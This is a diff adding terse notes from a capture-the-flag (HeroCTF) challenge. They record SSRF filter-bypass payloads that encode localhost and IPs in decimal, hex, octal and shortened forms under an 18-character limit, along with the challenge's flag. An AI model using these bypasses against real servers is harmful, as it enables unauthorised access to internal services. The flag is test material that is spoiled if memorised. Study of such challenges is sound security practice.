@@ -1,0 +1,33 @@
+sudo ./server.py 80
+
+Length limit: 18
+
+# 140.113.24.143
+http://2356222095
+	Work
+
+dig chall1.heroctf.fr
+	34.89.71.48
+
+34.89.71.48
+=> 0x22594730
+=> 576276272
+=> 04226243460
+
+
+http:576276272/flag
+	too long
+
+
+Are you trying to hack me?
+	http:127.0.0.1
+	http:localhost
+	http:127.0.1
+	http:127.1
+	0x7f000001
+	2130706433
+	http:0x7f.1
+
+http:0.0:3000/flag or http://0:3000/flag
+	Well played ! There is your flag : Hero{cl4ssic_SSRF_byP4pass_251094}
+
